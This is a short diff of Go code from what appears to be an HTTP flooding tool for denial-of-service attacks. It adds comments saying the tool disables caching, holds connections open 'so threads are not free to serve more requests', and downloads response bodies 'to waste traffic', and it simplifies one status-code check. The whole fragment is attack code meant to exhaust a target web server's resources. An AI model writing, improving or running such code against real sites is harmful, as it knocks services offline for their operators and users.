@@ -229,8 +229,10 @@ func (ws *Website) Start(endpoint string) {
 			// Set headers
 			req.Header.Set("Host", websiteURL.Host)
 			req.Header.Set("User-Agent", *flagUserAgent)
+			// Attempt to disallow caching responses
 			req.Header.Set("Pragma", "no-cache")
-			req.Header.Set("Cache-Control", "no-transform,no-store")
+			req.Header.Set("Cache-Control", "no-transform,no-store") 
+			// Try to keep sessions alive so threads are not free to serve more requests
 			req.Header.Set("Keep-Alive", "timeout=1000")
 			req.Header.Set("Connection", "keep-alive")
 			req.Header.Set("Accept-Encoding", "gzip,deflate")
@@ -259,9 +261,10 @@ func (ws *Website) Start(endpoint string) {
 				ws.Counter_code300++
 			} else if resp.StatusCode >= 200 {
 				ws.Counter_code200++
-			} else if resp.StatusCode >= 100 && resp.StatusCode < 200 {
+			} else if resp.StatusCode >= 100 {
 				ws.Counter_code100++
 			}
+			
 			ws.mux.Unlock()
 
 			// Download (and discard) response body to waste traffic
